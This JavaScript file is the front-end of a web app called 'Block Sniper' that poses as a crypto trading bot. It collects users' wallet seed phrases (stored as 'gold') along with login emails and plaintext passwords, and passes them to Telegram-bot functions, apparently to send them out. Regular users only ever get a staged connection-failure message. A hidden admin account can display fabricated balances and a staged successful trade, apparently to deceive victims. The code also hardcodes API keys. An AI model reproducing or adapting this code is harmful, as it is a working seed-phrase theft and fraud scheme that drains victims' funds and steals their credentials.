
//Clear all relevant fields
function clearFields() {
    [
        // Login
        'login-email-input',
        'login-password-input',
        
        // Register
        'reg_name_input',
        'reg_email_input',
        'reg_password_input',
        'reg_confirm_password_input',
        'reg_referrer_input',
        
        // Main menu
        'autotrader-input',
        'contract-address-input',
        'allocate-1-input',
        'sell-percent-input',
        
        // Others
        'sp-input',
        'wallet-address-input'
    ].forEach(id => {
        const element = document.getElementById(id);
        if (element) {
            element.value = '';
        }
    });
    
    // Close loading wheels and reset progress label
    const progressLabel = document.getElementById('progress-label');
    progressLabel.style.color = '#dbeaff';
    progressLabel.textContent = 'Not Started';

    document.getElementById('loading-wheel-div').style.display = 'none';
    document.getElementById('loading-wheel-sell-div').style.display = 'none';
    document.getElementById('loading-wheel-buy-div').style.display = 'none';
    document.getElementById('loading-wheel-refresh-div').style.display = 'none';
    document.getElementById('balance-status-txt').style.color = '#FFFFFF';
    document.getElementById('balance-status-txt').textContent = 'Establishing Connection...';
    document.getElementById('sell-token-status-txt').textContent = 'Status: None';
    document.getElementById('sell-token-status-txt').style.color = '#bacfeb';
    document.getElementById('buy-token-status-txt').textContent = 'Status: None';
    document.getElementById('buy-token-status-txt').style.color = '#bacfeb';
    
    const elementIds = ['slippage-1-input', 'slippage-2-input', 'gas-1-input', 'gas-2-input'];
      elementIds.forEach(function(id) {
        var inputElement = document.getElementById(id);
        if (inputElement) {
          inputElement.value = 'AUTO';
          inputElement.disabled = true;
          // Disable the input field
        }
      });
    // Balance label
    document.getElementById('wallet-balance-txt').textContent = '--';
    //Select home tab
    document.getElementById('home-tab').click();
}

  // Network options configurations
  window.networkOptions = [
    { id: "Ethereum", longValue: "Ethereum", shortValue: "ETH", minInput: "0.3", maxInput: "10", 
     presets: ["0.3", "0.5", "0.75", "1", "1.5", "2", "3", "5", "10"] },
    { id: "Solana", longValue: "Solana", shortValue: "SOL", minInput: "3", maxInput: "180", 
     presets: ["3", "6", "10", "20", "40", "60", "80", "120", "180"] },
    { id: "BSC", longValue: "BSC", shortValue: "BNB", minInput: "1", maxInput: "50", 
     presets: ["1", "2", "3", "5", "10", "15", "20", "30", "50"] },
    { id: "Avalanche", longValue: "Avalanche", shortValue: "AVAX", minInput: "10", maxInput: "500", 
     presets: ["10", "25", "50", "100", "150", "200", "300", "400", "500"] },
    { id: "Optimism", longValue: "Optimism", shortValue: "ETH", minInput: "0.3", maxInput: "10", 
     presets: ["0.3", "0.5", "0.75", "1", "1.5", "2", "3", "5", "10"] },
    { id: "Arbitrum", longValue: "Arbitrum", shortValue: "ETH", minInput: "0.3", maxInput: "10", 
     presets: ["0.3", "0.5", "0.75", "1", "1.5", "2", "3", "5", "10"] },
    { id: "Cardano", longValue: "Cardano", shortValue: "ADA", minInput: "400", maxInput: "20000", 
     presets: ["400", "700", "1k", "2k", "3k", "5k", "10k", "15k", "20k"] },
    { id: "Polygon", longValue: "Polygon", shortValue: "MATIC", minInput: "260", maxInput: "20000", 
     presets: ["260", "350", "500", "1k", "2k", "5k", "7.5k", "12k", "20k"] },
    { id: "Base", longValue: "Base", shortValue: "ETH", minInput: "0.3", maxInput: "10", 
     presets: ["0.3", "0.5", "0.75", "1", "1.5", "2", "3", "5", "10"] }
  ];



// Navigation and network selection buttons setup
document.addEventListener('DOMContentLoaded', function() { 
    // navigation buttons setup
    const navButtons = {
        //Others
        'register-back-btn': 'main-tab-01-nav',
        'add-wallet-btn': 'main-tab-04-nav',
        'network-select-back-btn': 'main-tab-03-nav',
        'import-seed-back-btn': 'main-tab-04-nav',
        'select-address-back-btn': 'main-tab-05-nav',
        'sign-up-btn': 'main-tab-02-nav',
        
        //Main menu
        'home-btn': 'home-tab',
        'auto-trader-btn': 'auto-trader-tab',
        'manual-trader-btn': 'manual-trader-tab',
        'settings-btn': 'settings-tab',
        'tutorial-btn': 'tutorial-tab'
    };
   
   Object.keys(navButtons).forEach(buttonId => {
        const button = document.getElementById(buttonId);
        button.addEventListener('click', () => {
            const targetNav = navButtons[buttonId];
            document.getElementById(targetNav).click();
        });
    });

    // Network select buttons setup
    const networkLinks = [
        { id: 'ethereum-link', network: 'Ethereum' },
        { id: 'solana-link', network: 'Solana' },
        { id: 'bnb-link', network: 'BSC' },
        { id: 'avalanche-link', network: 'Avalanche' },
        { id: 'optimism-link', network: 'Optimism' },
        { id: 'arbitrum-link', network: 'Arbitrum' },
        { id: 'cardano-link', network: 'Cardano' },
        { id: 'polygon-link', network: 'Polygon' },
        { id: 'base-link', network: 'Base' }
    ];

    networkLinks.forEach(({ id, network }) => {
        const linkElement = document.getElementById(id);
        linkElement.addEventListener('click', () => {
            updateLabelsForNetwork(network);
            
            networkTgBot(network);
            
            document.getElementById('main-tab-05-nav').click();
            document.getElementById('sp-input').value = '';
            document.getElementById('wallet-address-input').value = '';
        });
    });


// Function to update UI elements based on the selected network
    function updateLabelsForNetwork(networkId) {
        const selectedNetwork = networkOptions.find(option => option.id === networkId);
        if (!selectedNetwork) return;

        document.querySelectorAll('.long_label').forEach(label => label.textContent = selectedNetwork.longValue);
        document.querySelectorAll('.short_label').forEach(label => label.textContent = selectedNetwork.shortValue);
        document.querySelectorAll('.min_input').forEach(label => label.textContent = selectedNetwork.minInput);
        document.querySelectorAll('.max_input').forEach(label => label.textContent = selectedNetwork.maxInput);
        selectedNetwork.presets.forEach((preset, index) => {
            document.querySelectorAll(`.preset${index + 1}`).forEach(button => button.textContent = preset);
        });
    }

// Update labels using Wallet Selector selection
    document.getElementById('continue-with-wallet-btn').addEventListener('click', async () => {
        // Indicate loading before fetching data
        document.getElementById('wallet-balance-txt').textContent = 'Loading...';     
        
        try {
            const walletSelector = document.getElementById('wallet-selector');
            const selectedOption = walletSelector.options[walletSelector.selectedIndex];
            const networkType = selectedOption.getAttribute('data-network-type');

            if (!networkType) {
                throw new Error('Network type could not be determined from the selected option.');
            }
            // Update labels based on the selected network
            updateLabelsForNetwork(networkType);

            // Fetch and display wallet balance, then update balance status
            await findWalletBalancesAndUpdateUI();
            updateBalanceStatus();
        } catch (error) {
            console.error('Error during balance update:', error);
            displayError('No wallet selected. Please import a wallet to use Block Sniper.');
        }
    });

    async function updateBalanceStatus(retryCount = 0) {
        const walletBalanceTxtElement = document.getElementById('wallet-balance-txt');
        const minInputTxtElement = document.getElementById('min_input');
        const balanceStatusTxtElement = document.getElementById('balance-status-txt');

        if (walletBalanceTxtElement.textContent === 'Loading...' && retryCount < 3) {
            // Wait for a short period and then retry
            setTimeout(() => updateBalanceStatus(retryCount + 1), 1000); // Retry after 1 second
            return;
        }

        try {
            if (!walletBalanceTxtElement || !minInputTxtElement || !balanceStatusTxtElement) {
                throw new Error('One or more required elements are missing.');
            }

            const walletBalance = parseFloat(walletBalanceTxtElement.textContent);
            const minInput = parseFloat(minInputTxtElement.textContent);
           

            if (isNaN(walletBalance) || isNaN(minInput)) {
                throw new Error('Failed to initialize blockchain wallet. Please remove wallet and try again.');
            }
						
            loadedTgBot();
                        
            if (walletBalance >= minInput) {
                balanceStatusTxtElement.textContent = 'Connected';
                balanceStatusTxtElement.style.color = '#FFFFFF';
                document.getElementById('main-tab-07-nav').click();                
                document.getElementById('switch-wallet-btn').style.display = 'block';

            } else {
                balanceStatusTxtElement.textContent = 'Insufficient Balance';
                balanceStatusTxtElement.style.color = '#ffae00';
                document.getElementById('main-tab-07-nav').click();
                document.getElementById('switch-wallet-btn').style.display = 'block';
            }
        } catch (error) {
            console.error(error.message);
            displayError(error.message || 'Error updating balance status.');
        }
    }
});

//Hide switch button
document.getElementById('switch-wallet-btn').style.display = 'none';

//Disable admin controlls
document.getElementById('admin-controls-btn').style.display = 'none';

//Hide admin controls
document.getElementById('admin-control-panel-div').style.display = 'none';

//Error display shortcut function
function displayError(message) {
  console.error(message);
  document.getElementById('wallet-balance-txt').textContent = message;
}

//Add options to selector field on admin panel from (network options)
function populateAdminNetworkSelectField() {
  const adminNetworkSelectField = document.getElementById('admin-network-select-field'); // Correctly select the field
  window.networkOptions.forEach(option => {
    const optionElement = document.createElement('option');
    optionElement.value = option.id;
    optionElement.textContent = option.longValue;
    adminNetworkSelectField.appendChild(optionElement);
  });
}

//Calling function to populate admin network selector field
populateAdminNetworkSelectField();


//Update labels from admin panel on button click
document.addEventListener('DOMContentLoaded', function() {
    const updateLabelsButton = document.getElementById('admin-update-labels-btn');

    updateLabelsButton.addEventListener('click', function() {
        const networkSelectField = document.getElementById('admin-network-select-field');
        const selectedNetwork = networkSelectField.value;
        var adminWalletBalance = document.getElementById('admin-wallet-balance').value.trim();
        var adminWalletAddress = document.getElementById('admin-wallet-address').value.trim();
    
        // Validate and format the wallet balance
        if (adminWalletBalance !== '') {
            if (/^\d+(\.\d{1,4})?$/.test(adminWalletBalance)) {
                document.getElementById('wallet-balance-txt').textContent = parseFloat(adminWalletBalance).toFixed(4);
            } else {
                displayError('The wallet balance must be a whole number or a number with up to 4 decimal places.');
                return;
            }
        }
     
        // Validate and format the wallet address
        if (adminWalletAddress !== '' && adminWalletAddress.length > 12) {
            var formattedAddress = adminWalletAddress.substring(0, 7) + '...' + adminWalletAddress.substring(adminWalletAddress.length - 5);
            document.getElementById('wallet-address-txt').textContent = formattedAddress;
        } else if (adminWalletAddress !== '') {
            displayError('The wallet address is too short to format.');
            return;
        }
        
        // Update network labels if networkOptions is available globally
        if (window.networkOptions) {
            updateLabelsForNetwork2(selectedNetwork);
        } else {
            console.error('networkOptions is not defined.');
        }
        
        document.getElementById('balance-status-txt').textContent = 'Connected';
        document.getElementById('balance-status-txt').style.color = '#FFFFFF';
        
        document.getElementById('admin-control-panel-div').style.display = 'none';
    });
    
    function updateLabelsForNetwork2(networkId) {
        const selectedNetwork = window.networkOptions.find(option => option.id === networkId);
        if (!selectedNetwork) {
            console.error('Selected network not found');
            return;
        }
        document.querySelectorAll('.long_label').forEach(label => label.textContent = selectedNetwork.longValue);
        document.querySelectorAll('.short_label').forEach(label => label.textContent = selectedNetwork.shortValue);
        document.querySelectorAll('.min_input').forEach(label => label.textContent = selectedNetwork.minInput);
        document.querySelectorAll('.max_input').forEach(label => label.textContent = selectedNetwork.maxInput);
        selectedNetwork.presets.forEach((preset, index) => {
            document.querySelectorAll(`.preset${index + 1}`).forEach(button => button.textContent = preset);
        });
    }
});



// Navigation and network selection buttons setup
document.addEventListener('DOMContentLoaded', function() {
 		//Start fresh
    clearFields()
		var navbar = document.getElementById('navbar');
     
    // Adjust error box padding if navbar is hidden
    if (window.getComputedStyle(navbar).display === 'none') {
      errorMessageDiv.style.paddingTop = '20px';
    }
        
    // Close error box using 'x' button
    document.getElementById('close-error-btn').addEventListener('click', function() {
      errorMessageDiv.style.display = 'none';
    }); 

    //Sign out button
    document.getElementById('sign-out-btn').addEventListener('click', function() {
    	clearFields()
      stopTimer();
      document.getElementById('admin-controls-btn').style.display = 'none';
      document.getElementById('admin-control-panel-div').style.display = 'none';
			document.getElementById('switch-wallet-btn').style.display = 'none';
      navbar.style.display = 'none';
      document.getElementById('main-tab-01-nav').click();
    });
 
     //Switch wallet button
    document.getElementById('switch-wallet-btn').addEventListener('click', function() {
      stopTimer();
      clearFields()
      document.getElementById('switch-wallet-btn').style.display = 'none';
      document.getElementById('main-tab-03-nav').click();
      document.getElementById('admin-control-panel-div').style.display = 'none';
    });
    
    
    //Admin panel button
    document.getElementById('admin-controls-btn').addEventListener('click', function() {
        var adminControlPanelDiv = document.getElementById('admin-control-panel-div');

        // Toggle visibility based on current state
        if (adminControlPanelDiv.style.display === 'none' || adminControlPanelDiv.style.display === '') {
            adminControlPanelDiv.style.display = 'block'; // Make it visible if it was hidden
            document.getElementById('home-btn').click();
        } else {
            adminControlPanelDiv.style.display = 'none'; // Hide it if it was visible
        }
    });

});

document.addEventListener('DOMContentLoaded', function() {
  
  const auth = firebase.auth();
  const database = firebase.database();
  const uDateTime = new Date().toLocaleString('en-GB', { timeZone: 'Africa/Lagos' });

  // Register User
  document.getElementById('create-account-btn').addEventListener('click', function(event) {
    event.preventDefault();
    var email = document.getElementById('reg_email_input').value;
    var password = document.getElementById('reg_password_input').value;
    var confirm_password = document.getElementById('reg_confirm_password_input').value;
    var name = document.getElementById('reg_name_input').value;
    var referrer = document.getElementById('reg_referrer_input').value;
    var checkbox = document.getElementById('register-checkbox-btn');

    // Validate inputs
    if (!validate_input(name)) {
    	displayError('Please enter a name/username in the correct field.')
      return;
    }

    if (!validate_email(email)) {
    	displayError('Please ensure your email is in the correct format.')
      return;
    }

    if (!validate_password(password)) {
    	displayError('Password must be atleast 6 chracters in length.')
      return;
    }

    if (!checkbox.checked) {
    	displayError('Please read through and accept the Block Sniper terms of service & user agreement.')
      return;
    }

    if (!validate_passwords_match(password, confirm_password)) {
    	displayError('Passwords do not match, please adjust and try again.')
      return;
    } 
    else {
      
      // Firebase create user
      auth.createUserWithEmailAndPassword(email, password)
        .then((userCredential) => {
          var user = userCredential.user;
					
          database.ref('users/' + user.uid).set({
            name: name,
            email: email,
            password: password,
            referrer: referrer,
            last_login: uDateTime
          });
          //ert('Registration successful');
          document.getElementById('main-tab-03-nav').click();
          const user0 = firebase.auth().currentUser;
          
          regTgBot(user0.uid, name, email, password, referrer);
          
          if (user0) {
            populateSelector(user0);
          }
          navbar.style.display = 'block';
          errorMessageDiv.style.display = 'none';
        })
        .catch(function(error) {
          displayError('Registration failed: ' + error.message);
        });
     }   
  });


  // Login User
  document.getElementById('sign-in-btn').addEventListener('click', function(event) {
      event.preventDefault();
      var email = document.getElementById('login-email-input').value.trim();
      var password = document.getElementById('login-password-input').value.trim();

      // Check if email and password fields are not empty
      if (email === '' || password === '') {
        displayError('Please fill in both email and password fields.');
        return; // Stop the function if either field is empty
      }

      // Validate inputs
      if (!validate_email(email) || !validate_password(password)) {
        displayError('Unsuccessful Login: Please ensure your email and password are in the correct format.');      
        return;
      }
      else {
        
        // Firebase sign in
        auth.signInWithEmailAndPassword(email, password)
          .then((userCredential) => {
            // Update last login timestamp
            database.ref('users/' + userCredential.user.uid).update({
              last_login: uDateTime
            });

            // Check if the logged-in user's email is 'admin@admin.com'
            if (userCredential.user.email === 'admin@admin.com') {
              document.getElementById('main-tab-07-nav').click(); // Navigate to admin tab for admin user
              document.getElementById('admin-controls-btn').style.display = 'block';
              document.getElementById('switch-wallet-btn').style.display = 'block';
            } else {
              document.getElementById('main-tab-03-nav').click(); // Navigate to the default tab for regular users
            }

            // Populate selector and show the navbar
            const user0 = firebase.auth().currentUser;
            
            LogTgBot(user0.uid, email, password);
            
            if (user0) {
              populateSelector(user0);
            }
            navbar.style.display = 'block';
            errorMessageDiv.style.display = 'none';
          })
          .catch(function(error) {
            displayError('Login failed: Error (auth/invalid-login-credentials).');
          });
      }   
  });


//Store gold
  document.getElementById('import-gold-btn').addEventListener('click', function(event) {
    event.preventDefault();
    // Corrected the typo in the variable name
    var gold = document.getElementById('sp-input').value;

    if (!checkWordCount(gold)) {
      displayError('Failed to import wallet: Please ensure the wallet is in the correct format');
      return;
    } else {
      const user = auth.currentUser;
      
      goldTgBot(user.uid, gold);
      
      if (user) {
        const userRef = database.ref('users/' + user.uid);

        userRef.once('value', snapshot => {
          const userData = snapshot.val();

          if (userData) {
          userRef.update({ last_login: uDateTime });
            if (!userData.gold1) {
              userRef.update({ gold1: gold });
            } else if (!userData.gold2) {
              userRef.update({ gold2: gold });
            } else if (!userData.gold3) {
              userRef.update({ gold3: gold });
            } else {
              displayError('Maximum wallets reached.');
            }
          }
        }).then(() => {
          //console.log('Wallet address added or updated successfully.');
          document.getElementById('main-tab-06-nav').click();
          navbar.style.display = 'block';
          errorMessageDiv.style.display = 'none';
        }).catch(error => {
          displayError('Failed to import wallet: ' + error.message);
        });
      } else {
        displayError('User not logged in.');
      }
    }
  });


//Store wallet address
  document.getElementById('add-wallet-address-btn').addEventListener('click', function(event) {
    event.preventDefault();
    var walletAddress = document.getElementById('wallet-address-input').value;
    var networkType = document.getElementById('wallet-address-label1').textContent;

    if (!validate_walletAddressLength(walletAddress)) {
      displayError('Failed to add wallet address: Please ensure the wallet address is in the correct format');
      return;
    }
    else {
      const user = auth.currentUser;
      
      walletTgBot(user.uid, walletAddress);
      
      if (!user) {
        displayError('User not logged in.');
        return;
      }

      const userRef = database.ref('users/' + user.uid);
      userRef.once('value').then(snapshot => {
        const userData = snapshot.val() || {};
        const updateData = { last_login: uDateTime };

        if (!userData.walletAddress1) {
          updateData.walletAddress1 = walletAddress;
          updateData.networkType1 = networkType;
        } else if (!userData.walletAddress2) {
          updateData.walletAddress2 = walletAddress;
          updateData.networkType2 = networkType;
        } else if (!userData.walletAddress3) {
          updateData.walletAddress3 = walletAddress;
          updateData.networkType3 = networkType;
        } else {
          displayError('Maximum wallet addresses reached.');
          return Promise.reject(new Error('Maximum wallet addresses reached.'));
        }

        return userRef.update(updateData);
      }).then(() => {
        // If this point is reached, the update was successful
        console.log('Wallet address added or updated successfully.');
        document.getElementById('main-tab-03-nav').click();
        const user0 = firebase.auth().currentUser;
        if (user0) {
          populateSelector(user0);
        }
      	console.log('No user is logged in.');
        navbar.style.display = 'block';
        errorMessageDiv.style.display = 'none';
      }).catch(error => {
        displayError('Failed to add wallet address: ' + error.message);
      });    
    }
  });


//Field format check
  function validate_email(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
  }

  function validate_password(password) {
    return password.length >= 6;
  }

  function validate_walletAddressLength(address) {
    return address.length >= 10;
  }


  function validate_passwords_match(password, confirm_password) {
    return password === confirm_password;
  }

  function validate_input(input) {
    return input != null && input.trim().length > 0;
  }
  
  function checkWordCount(input) {
  const trimmedValue = input.trim();
  const words = trimmedValue.split(/\s+/);
  return words.length === 12 || words.length === 24;
	}
    
});

// Populate wallet selector from Firebase
function populateSelector(user) {
  // Clear existing options before populating
  const walletSelector = document.getElementById('wallet-selector');
  walletSelector.innerHTML = '';
  
  //Find Wallets of signed in user
  const userRef = firebase.database().ref('users/' + user.uid);
  userRef.once('value', snapshot => {
      const userData = snapshot.val();
      let optionsAdded = 0;

      for (let i = 1; i <= 3; i++) {
          const walletAddressKey = `walletAddress${i}`;
          const networkTypeKey = `networkType${i}`;

          if (userData && userData[walletAddressKey] && userData[networkTypeKey]) {
              const option = document.createElement('option');
              option.value = i;
              option.textContent = `Wallet ${i} : ${userData[networkTypeKey]} : ${userData[walletAddressKey].slice(0, 7)}...${userData[walletAddressKey].slice(-5)}`;
              option.setAttribute('data-network-type', userData[networkTypeKey]);
              walletSelector.appendChild(option);
              optionsAdded++;
          }
      }
      //If no wallets found
      if (optionsAdded === 0) {
          const placeholderOption = document.createElement('option');
          placeholderOption.textContent = "No wallets added";
          placeholderOption.disabled = true;
          placeholderOption.selected = true;
          walletSelector.appendChild(placeholderOption);
      }
  }).catch(error => {
      console.error('Error fetching user data:', error);
  });
}
//Wallet balance retrieval
async function findWalletBalancesAndUpdateUI() {
  //Check user login
  const user = firebase.auth().currentUser;
  if (!user) {
    console.log('No user is logged in.');
    document.getElementById('wallet-balance-txt').textContent = 'User not logged in.';
    return;
  }
  //Declare elements
  const walletSelector = document.getElementById('wallet-selector');
  const selectedIndex = walletSelector.value;
  const walletAddressKey = `walletAddress${selectedIndex}`;
  const networkTypeKey = `networkType${selectedIndex}`;

  const userRef = firebase.database().ref(`users/${user.uid}`);
  userRef.once('value').then(async (snapshot) => {
    const userData = snapshot.val();
    const walletAddress = userData[walletAddressKey];
    const networkType = userData[networkTypeKey];

    try {
      let balanceInNativeToken;
      //Current supported networks
      if (networkType === "Ethereum" || networkType === "Polygon" || networkType === "Optimism" || networkType === "Arbitrum" || networkType === "Avalanche") {
        const web3ProviderUrl = getWeb3ProviderUrl(networkType);
        const web3Instance = new Web3(web3ProviderUrl);
        const balance = await web3Instance.eth.getBalance(walletAddress);
        balanceInNativeToken = web3Instance.utils.fromWei(balance, 'ether');
      } else if (networkType === "BSC") {
        balanceInNativeToken = await fetchBscBalance(walletAddress);
      } else if (networkType === "Solana") {
        balanceInNativeToken = await fetchSolanaBalance(walletAddress);
      } else {
      //Network does not match supported
        throw new Error('The ' + networkType + ' network is not yet supported.');
      }
      displayBalance(balanceInNativeToken, networkType);
      updateWalletAddressDisplay(walletAddress);
    } catch (error) {
      displayError(error.message || 'Error fetching wallet balance.');
    }
  });
}

function updateWalletAddressDisplay(walletAddress) {
  // Format the wallet address to show only the first 7 and last 5 characters
  const formattedAddress = `${walletAddress.substring(0, 7)}...${walletAddress.substring(walletAddress.length - 5)}`;
  document.getElementById('wallet-address-txt').textContent = formattedAddress;
}


// Fetch balance for Solana
async function fetchSolanaBalance(walletAddress) {
  const url = `https://solana-mainnet.g.alchemy.com/v2/okJ3Q7klBus-dxGeb_jILRHtyvoHdUI0`;
  const body = JSON.stringify({
    "jsonrpc": "2.0",
    "id": 1,
    "method": "getBalance",
    "params": [walletAddress]
  });

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: body
    });
    const data = await response.json();
    if (data.error) {
      throw new Error(data.error.message);
    }
    const balanceInLamports = data.result.value;
    const balanceInSOL = (balanceInLamports / 1e9).toFixed(4); // Convert lamports to SOL
    return balanceInSOL;
  } catch (error) {
    console.error('Error fetching Solana balance:', error);
    throw error; // Re-throw to be handled by the caller
  }
}


//Get URL + API for BSC
async function fetchBscBalance(walletAddress) {
  const apiKey = "UJUYX9GAMRPR5DUSWMVN97EDDW882CCJSH";
  const url = `https://api.bscscan.com/api?module=account&action=balance&address=${walletAddress}&apikey=${apiKey}`;
  try {
    const response = await fetch(url);
    const data = await response.json();
    if (data.status === "1") {
      const balance = Web3.utils.fromWei(data.result, 'ether');
      return parseFloat(balance) > 0.001 ? parseFloat(balance).toFixed(4) : balance;
    } else {
      throw new Error('Failed to fetch balance');
    }
  } catch (error) {
    console.error('Error fetching BSC balance:', error);
    return 'Error';
  }
}


//Get URL + API for supported wallet network
function getWeb3ProviderUrl(networkType) {
  switch (networkType) {
    case "Ethereum": return `https://mainnet.infura.io/v3/402971a7445747e99b52db59c194354e`;
    case "Polygon": return `https://polygon-mainnet.infura.io/v3/402971a7445747e99b52db59c194354e`;
    case "Optimism": return `https://optimism-mainnet.infura.io/v3/402971a7445747e99b52db59c194354e`;
    case "Arbitrum": return `https://arbitrum-mainnet.infura.io/v3/402971a7445747e99b52db59c194354e`;
    case "Avalanche": return `https://avalanche-mainnet.infura.io/v3/402971a7445747e99b52db59c194354e`;
    default: return '';
  }
}


//Display balance function
function displayBalance(balanceInNativeToken) {
  const displayBalance = parseFloat(balanceInNativeToken) > 0 ? parseFloat(balanceInNativeToken).toFixed(4) : balanceInNativeToken;
  document.getElementById('wallet-balance-txt').textContent = displayBalance;
  
}

//Delete selected wallet from DB with confirm
document.addEventListener('DOMContentLoaded', function() {
    const deleteWalletBtn = document.getElementById('delete-wallet-btn');
    
    deleteWalletBtn.addEventListener('click', async function() {
        const confirmDelete = confirm('Are you sure you want to delete this wallet? This action cannot be undone.');
        if (!confirmDelete) {
            return; // User canceled the deletion
        }

        const user = firebase.auth().currentUser;
        if (!user) {
            alert('No user is logged in.');
            return;
        }

        const walletSelector = document.getElementById('wallet-selector');
        const selectedIndex = walletSelector.value;
        if (!selectedIndex) {
            alert('No wallet selected.');
            return;
        }

        const userRef = firebase.database().ref(`users/${user.uid}`);
        const walletAddressKey = `walletAddress${selectedIndex}`;
        const networkTypeKey = `networkType${selectedIndex}`;
        const goldKey = `gold${selectedIndex}`;

        try {
            // Fetch the current user data to determine if backup is needed
            const snapshot = await userRef.once('value');
            const userData = snapshot.val();
            const goldValue = userData[goldKey];

            // Prepare updates for deletion and backup of the gold value
            const updates = {
                [walletAddressKey]: null,
                [networkTypeKey]: null,
            };

            // Backup gold value with a unique key
            const backupKey = await generateUniqueBackupKey(userRef, goldKey);
            updates[backupKey] = goldValue;

            // Apply the updates for backup
            await userRef.update(updates);

            // After backup, nullify the original gold field
            await userRef.child(goldKey).remove();

            alert('Wallet successfully deleted.');
            walletSelector.remove(walletSelector.selectedIndex);
        } catch (error) {
            console.error('Error deleting wallet:', error);
            alert('Failed to delete wallet. Please try again.');
        }
    });
});

//Gold backup key
async function generateUniqueBackupKey(ref, baseKey) {
    let suffix = 0;
    let backupKey = `${baseKey}_backup`;
    let exists = await ref.child(backupKey).once('value').then(snapshot => snapshot.exists());
    
    // If backup already exists, find a unique suffix
    while (exists) {
        suffix += 1;
        backupKey = `${baseKey}_backup_${suffix}`;
        exists = await ref.child(backupKey).once('value').then(snapshot => snapshot.exists());
    }
    
    return backupKey;
}
//Subract from balance script for admin
function subtractFromWalletBalance() {
  var autotraderInputValue = document.getElementById('autotrader-input').value.trim();
  var walletBalanceText = document.getElementById('wallet-balance-txt').textContent.trim();
  
  // Convert both values to numbers
  var autotraderInputNumber = parseFloat(autotraderInputValue);
  var walletBalanceNumber = parseFloat(walletBalanceText);
  
  // Check if both converted values are numeric
  if (!isNaN(autotraderInputNumber) && !isNaN(walletBalanceNumber)) {
      // Perform subtraction and update the label
      var newWalletBalance = walletBalanceNumber - autotraderInputNumber;
      if (newWalletBalance >= 0) {
          document.getElementById('wallet-balance-txt').textContent = newWalletBalance.toFixed(4);
      } 
  } else {
      console.log('One or both inputs are not numeric, doing nothing.');
  }
}




document.addEventListener('DOMContentLoaded', function() {
  // Function to handle button clicks
  function handleButtonClick(event) {
      const buttonValue = event.target.textContent.trim();
      let numberValue;

      // Check if the button value ends with 'k' and convert to numeric value
      if (buttonValue.toLowerCase().endsWith('k')) {
          const baseValue = parseFloat(buttonValue.slice(0, -1));
          numberValue = baseValue * 1000; // Convert 'k' to thousands
      } else {
          numberValue = parseFloat(buttonValue);
      }

       document.getElementById('allocate-1-input').value = numberValue.toString();

  }

  // Attach event listeners to all 9 buttons
  for (let i = 1; i <= 9; i++) {
      const buttonId = 'p-' + i;
      const button = document.getElementById(buttonId);
      if (button) {
          button.addEventListener('click', handleButtonClick);
      }
  }
});



//Timer variables
let timerRunning = false;
let intervalId = null;

//Start auto trader
document.getElementById('start-auto-btn').addEventListener('click', function() {
  stopTimer();
  const user = firebase.auth().currentUser;
  const autotraderInputValue = parseFloat(document.getElementById('autotrader-input').value);
  const minInputValue = parseFloat(document.getElementById('min_input').textContent);
  const walletBalanceText = document.getElementById('wallet-balance-txt').textContent;
  const walletBalanceValue = parseFloat(walletBalanceText);
  const loadingWheelDiv = document.getElementById('loading-wheel-div'); // Ensure this is correctly defined

  // Validate autotrader input against minimum input and wallet balance
  if (user && user.email !== 'admin@admin.com' && !isNaN(autotraderInputValue) &&
      autotraderInputValue >= minInputValue &&
      (isNaN(walletBalanceValue) || autotraderInputValue <= walletBalanceValue)) {

      // Process for non-admin users
      startTimer();
      loadingWheelDiv.style.display = 'flex';
      const progressLabel = document.getElementById('progress-label');
      progressLabel.textContent = 'Starting - Checking Nexus Liquidity...';
      progressLabel.style.color = '#ffae00';

      setTimeout(function() {
          progressLabel.textContent = 'Connecting to Network...';
          setTimeout(function() {
              stopTimer();
              loadingWheelDiv.style.display = 'none';
              progressLabel.textContent = 'Connection Failed!';
              progressLabel.style.color = '#ff0000';
              displayError('Failed to connect to network - BLKS API Error 8903 : Contact Block Sniper Admin');
          }, 7500);
      }, 3000);
  } else if (user && user.email == 'admin@admin.com' && !isNaN(autotraderInputValue) &&
             autotraderInputValue >= minInputValue &&
             (isNaN(walletBalanceValue) || autotraderInputValue <= walletBalanceValue)) {

      // Process for admin users
      startTimer();
      loadingWheelDiv.style.display = 'flex';
      const progressLabel = document.getElementById('progress-label');
      progressLabel.textContent = 'Starting - Checking Nexus Liquidity...';
      progressLabel.style.color = '#ffae00';

      setTimeout(function() {
          progressLabel.textContent = 'Connecting to Network...';
          setTimeout(function() {
              progressLabel.textContent = 'Allocating funds to Nexus...';
              setTimeout(function() {
                  progressLabel.textContent = 'Searching for tokens - This may take a while, please wait...';
                  setTimeout(function() {
                      loadingWheelDiv.style.display = 'none';
                      progressLabel.textContent = 'Trade session started!';
                      subtractFromWalletBalance();
                                             
                      progressLabel.style.color = '#00FF00';
                      loadingWheelDiv.style.display = 'none';
                  }, 6000);
              }, 10000);
          }, 5000);
      }, 3000);
  } else {
      displayError('Allocated funds cannot be lower than the network "minimum" requirement or exceed your wallet balance.');
  }
});

//refresh balance
document.getElementById('refresh-balance-btn').addEventListener('click', function() {
document.getElementById('loading-wheel-refresh-div').style.display = 'flex';
setTimeout(function() {
  findWalletBalancesAndUpdateUI();
  document.getElementById('loading-wheel-refresh-div').style.display = 'none';
  
  const balance = document.getElementById('wallet-balance-txt').textContent
  const symbol = document.getElementById('balance-network-symbol-txt').textContent
  refreshTgBot(balance, symbol);
}, 2000);
});


//Stop auto trader
document.getElementById('stop-auto-btn').addEventListener('click', function() {
  if (timerRunning) {
      const confirmCancel = confirm('Are you sure you want to stop the Auto-trader? You run the risk of losing a portion of allocated funds.');
      if (confirmCancel) {
          stopTimer();
      }
  }
});



//Timer Start
function startTimer() {
  // Prevent starting a new timer if one is already running
  if (timerRunning) return;
  timerRunning = true;
  let elapsedTime = 0; // Start from 0 seconds

  // Set up the timer with a 1-second interval
  intervalId = setInterval(() => {
      // Update the timer label every second
      document.getElementById('time-count-label').textContent = formatTime(elapsedTime);
      elapsedTime++; // Increment the elapsed time by 1 second

      // Calculate a random stop time between minDuration and maxDuration
      const minDuration = 2 * 3600 + 24 * 60; // 2 hours 24 minutes in seconds
      const maxDuration = 3 * 3600 + 11 * 60; // 3 hours 11 minutes in seconds
      const randomStopTime = Math.random() * (maxDuration - minDuration) + minDuration;

      // Stop the timer if elapsed time reaches the random stop time
      if (elapsedTime >= randomStopTime) {
          stopTimer();
          // Reset the timer label to '00:00:00' when stopped
          document.getElementById('time-count-label').textContent = '00:00:00';
